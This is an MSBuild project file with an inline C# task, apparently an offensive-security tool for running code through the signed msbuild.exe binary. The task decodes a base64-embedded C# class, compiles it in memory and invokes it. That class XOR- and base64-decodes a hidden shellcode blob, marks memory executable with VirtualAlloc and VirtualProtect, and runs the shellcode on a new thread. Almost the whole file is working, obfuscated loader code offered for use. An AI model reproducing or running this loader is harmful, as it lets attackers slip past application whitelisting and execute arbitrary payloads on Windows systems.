<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe nps.xml -->
  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->
  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->
  <!-- Created C# payload: Franci Sacer, Twitter: @francisacer1 -->
  <!-- License: BSD 3-Clause -->
  <Target Name="npscsharp">
   <nps />
  </Target>
  <UsingTask
    TaskName="nps"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using System.Collections.Generic;
        using System.Linq;
        using System.Text;
        using System.Runtime.InteropServices;
        using System.Collections.ObjectModel;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        using Microsoft.CSharp;
        using System.CodeDom.Compiler;
        using System.Reflection;

        public class nps : Task, ITask
        {
            public override bool Execute()
            {
                Console.WriteLine("hey");
                string cmd = "CnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwp1c2luZyBTeXN0ZW0uVGV4dDsKcHVibGljIGNsYXNzIENsYXNzRXhhbXBsZQp7CiAgICBwcml2YXRlIHN0YXRpYyBVSW50MzIgTUVNX0NPTU1JVCA9IDB4MTAwMDsKICAgIHByaXZhdGUgc3RhdGljIFVJbnQzMiBQQUdFX1JFQURXUklURSA9IDB4MDQ7CiAgICBwcml2YXRlIHN0YXRpYyBVSW50MzIgUEFHRV9FWEVDVVRFX1JFQUQgPSAweDIwOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBVSW50MzIgVmlydHVhbEFsbG9jKFVJbnQzMiBscFN0YXJ0QWRkciwgVUludDMyIHNpemUsIFVJbnQzMiBmbEFsbG9jYXRpb25UeXBlLCBVSW50MzIgZmxQcm90ZWN0KTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgYWRkcmVzcywgVUludDMyIHNpemUsIFVJbnQzMiBuZXdQcm90ZWN0LCBvdXQgVUludDMyIG9sZFByb3RlY3QpOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlVGhyZWFkKAogICAgICAgIFVJbnQzMiBscFRocmVhZEF0dHJpYnV0ZXMsCiAgICAgICAgVUludDMyIGR3U3RhY2tTaXplLAogICAgICAgIFVJbnQzMiBscFN0YXJ0QWRkcmVzcywKICAgICAgICBJbnRQdHIgcGFyYW0sCiAgICAgICAgVUludDMyIGR3Q3JlYXRpb25GbGFncywKICAgICAgICByZWYgVUludDMyIGxwVGhyZWFkSWQKICAgICk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIFVJbnQzMiBXYWl0Rm9yU2luZ2xlT2JqZWN0KEludFB0ciBoSGFuZGxlLCBVSW50MzIgZHdNaWxsaXNlY29uZHMpOwogICAgcHVibGljIHZvaWQgRXhlY3V0ZSgpIHsKICAgICAgICBzdHJpbmcgcmF3ID0gQCJRQVFuSWdJTkpBSVJQUTAvSzFVV1d6OWJJekVHZWdjc0tuMHNGaUZIS2p3aUFUQjdIQUFxYVIwUE5na2xEU3d3QVRrckF5Sm5ISGhpSENnVk9YODZNZ1lGRVFnWVBSY2VJMjQrV2dVcktoUTZFam83Q2cwdEZ5RkVDQXBTVENSNlB4QXhDaTR2Rnhsc2VoOEJNZ05URVI1TVBsY3lERHNDQ1MwcFZpVWZOM0o5TWdvZk1YVUZjbVpZQXdvckRqc3RGQTRTQVhoQUVCWVBRUnhoUHo4ekxTVU5PZ01hR2draUhSSk1ORDRIYlZFL0VpNDBCUjEvRGlFaE0zTUpNd3RnQjJGaFFBQXRDZ3NMTWhjcGJIVXdPM3BGTFFjekJ4cGtZQzVXQnk0S0RDOGhmeFV6S2pNYk95cE1BVVViS1NNcE9Ya2lGQmtMWEhBckRTRWNNSFVWQWhvQUozRW1EUndZSWhzM0x5b2FNaVVvVDJCSEdSTWdQd3NoSVJrT0gxRTBBeWNoSUFkaElGd2ZMd1lxTm5rNkZ3SUxBblVlR2c0OVNROENaQU5ZRFFJNmVnQU9FUU1zQWdrN0NTVW5keFZ4R2xrR0t3NTZJaW9TZkM4N0tVVWhZVHhoWlZzYVBBNG9OaHdBRWhJaEFTSWRHU1pnQTNBU2FCZ3lNRElLSW44S0lBZ25JaHNmTlNjeGN3Si9ERHdGZGp3aER4c1hHVE1QSFNOU0t6SnlQQVViUFE0RFBBTVVOaEVnRFRzZUhqVThLbUVrYWdRRUpDODdJUWd2RVNjck5pb3pOaW93Y0NSV0dBRU9QaUVPZmlBV0N3MGJJUzVNRkVrUEEzb3VCaXdwTGc4Q0Jpc0tLeGNkUlFjSE1GcytRZ0E1Vm5GQWNoazJJaXNWSlNrOUlpa25keGQ2WWkwTkF6b01JUWNWSVExeUdnUlZGRWtQQW1RRFd5d1NPU1lwRlFFa0RYUm5UVFFWRVg0QlpUY2pCUkl1Q2d3T0VSd2tjbndrVEFVeUJReCtZQzhKQnk0S0RCQVNDd0lDRFRVaUVnZDNGWEVIS3lBU0RnMG5DaFpuUFd4NUxpMEhNd0k2WGdCWUJRY21DZzhnRm4wL0xBMEVBaGxTUUh0bVBna2dkaFYvUFNrQ0x5b0ZQenc3UHpGN0dsWmdMUlJwUUdSMkdRMDJMRFlISUFRbUtGdzNSUmsrTndjYVpBMVFMQ0EvTWdreU0zeFhaMmtOIjsKICAgICAgICBieXRlW10gc2hlbGxjb2RlID0gQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKHhvckl0KCJvS05hQ0xlQ0h0Y1NmNlQwVmpiRiIsIEJhc2U2NERlY29kZShyYXcpKSk7CiAgICAgICAgVUludDMyIGZ1bmNBZGRyID0gVmlydHVhbEFsbG9jKDAsIChVSW50MzIpc2hlbGxjb2RlLkxlbmd0aCwgTUVNX0NPTU1JVCwgUEFHRV9SRUFEV1JJVEUpOwogICAgICAgIE1hcnNoYWwuQ29weShzaGVsbGNvZGUsIDAsIChJbnRQdHIpKGZ1bmNBZGRyKSwgc2hlbGxjb2RlLkxlbmd0aCk7CiAgICAgICAgVUludDMyIG9sZFByb3RlY3Q7CiAgICAgICAgVmlydHVhbFByb3RlY3QoKEludFB0cikoZnVuY0FkZHIpLCAoVUludDMyKXNoZWxsY29kZS5MZW5ndGgsIFBBR0VfRVhFQ1VURV9SRUFELCBvdXQgb2xkUHJvdGVjdCk7CiAgICAgICAgSW50UHRyIGhUaHJlYWQgPSBJbnRQdHIuWmVybzsKICAgICAgICBVSW50MzIgdGhyZWFkSWQgPSAwOwogICAgICAgIEludFB0ciBwaW5mbyA9IEludFB0ci5aZXJvOwogICAgICAgIGhUaHJlYWQgPSBDcmVhdGVUaHJlYWQoMCwgMCwgZnVuY0FkZHIsIHBpbmZvLCAwLCByZWYgdGhyZWFkSWQpOwogICAgICAgIFdhaXRGb3JTaW5nbGVPYmplY3QoaFRocmVhZCwgMHhGRkZGRkZGRik7CiAgICB9CgogICAgcHVibGljIHN0YXRpYyBzdHJpbmcgeG9ySXQoc3RyaW5nIGtleSwgc3RyaW5nIGlucHV0KQogICAgewogICAgICAgIFN0cmluZ0J1aWxkZXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcigpOwogICAgICAgIGZvcihpbnQgaT0wOyBpIDwgaW5wdXQuTGVuZ3RoOyBpKyspCiAgICAgICAgICAgIHNiLkFwcGVuZCgoY2hhcikoaW5wdXRbaV0gXiBrZXlbKGkgJSBrZXkuTGVuZ3RoKV0pKTsKICAgICAgICBTdHJpbmcgcmVzdWx0ID0gc2IuVG9TdHJpbmcoKTsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEJhc2U2NEVuY29kZShzdHJpbmcgdGV4dCkgewogICAgICAgcmV0dXJuIFN5c3RlbS5Db252ZXJ0LlRvQmFzZTY0U3RyaW5nKFN5c3RlbS5UZXh0LkVuY29kaW5nLlVURjguR2V0Qnl0ZXModGV4dCkpOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEJhc2U2NERlY29kZShzdHJpbmcgZW5jb2RlZHRleHQpIHsKCSAgICByZXR1cm4gU3lzdGVtLlRleHQuRW5jb2RpbmcuVVRGOC5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhlbmNvZGVkdGV4dCkpOwogICAgfQp9";
                CSharpCodeProvider nps = new CSharpCodeProvider();
                CompilerParameters parameters = new CompilerParameters();
                parameters.ReferencedAssemblies.Add("System.dll");
                parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
                parameters.GenerateExecutable = false;
                parameters.GenerateInMemory = true;
                parameters.IncludeDebugInformation = false;
                CompilerResults results = nps.CompileAssemblyFromSource(parameters, Base64Decode(cmd));
                Assembly assembly = results.CompiledAssembly;
                object obj = assembly.CreateInstance("ClassExample");
                obj.GetType().InvokeMember("Execute", BindingFlags.InvokeMethod, null, obj, null);
                return true;
            }

            public static string Base64Encode(string text) {
               return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
            }

            public static string Base64Decode(string encodedtext) {
                return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
